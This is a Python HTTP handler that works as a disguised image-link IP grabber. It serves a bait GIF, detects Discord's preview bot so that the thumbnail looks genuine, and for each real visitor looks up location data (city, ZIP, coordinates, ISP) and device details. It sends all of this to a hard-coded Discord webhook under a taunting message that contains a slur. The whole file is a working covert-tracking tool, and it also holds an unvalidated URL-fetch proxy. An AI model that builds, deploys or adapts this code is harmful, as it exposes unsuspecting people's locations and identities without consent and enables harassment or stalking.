from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import httpagentparser

# === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content

# Tiny blank pixel for "broken open" if you want to force disappointment after click (optional bait)
blank_pixel = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\xdcc\xf8\x0f\x00\x01\x01\x01\x00\x18\xdd\x03\x03\x00\x00\x00\x00IEND\xaeB`\x82'

# Set to True if you want "open original" to show blank (makes it look broken after click)
break_open = False

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [
            {
                "title": "DADDY BOB STRIKES AGAIN!",
                "color": 16711803,
                "description": "A New Retard Opened The \"Gif\" LOL.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}",
                        "inline": False
                    }
                ]
            }
        ]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `{uag}`",
                "author": {"name": "Fentanyl"}
            }
        ]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get real IP
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else self.client_address[0]
            useragent = self.headers.get('user-agent', 'No User Agent Found!')
            os, browser = httpagentparser.simple_detect(useragent)

            # Parse ?url= proxy load
            query = parse.urlsplit(self.path).query
            dic = dict(parse.parse_qsl(query))
            try:
                data = httpx.get(dic['url']).content if 'url' in dic else bindata
            except Exception:
                data = bindata

            # Detect Discord preview/bot
            is_discord_preview = ('discord' in useragent.lower() or 
                                  ip.startswith(('35.', '34.', '104.196.', '162.158.', '194.195.')))

            if is_discord_preview:
                # Preview gets real image → perfect thumbnail
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(data)
                httpx.post(webhook, json=prev(ip, useragent))
                return

            # Real user open → grab IP, serve real or blank
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(blank_pixel if break_open else data)

            # Send grab to webhook
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                payload = formatHook(
                    ipInfo.get('ip', ip),
                    ipInfo.get('city', 'Unknown'),
                    ipInfo.get('region', 'Unknown'),
                    ipInfo.get('country', 'Unknown'),
                    ipInfo.get('loc', 'Unknown'),
                    ipInfo.get('org', 'Unknown'),
                    ipInfo.get('postal', 'Unknown'),
                    useragent,
                    os,
                    browser
                )
                httpx.post(webhook, json=payload)
            except Exception:
                httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))

        except Exception:
            # Fallback
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(bindata)
        return
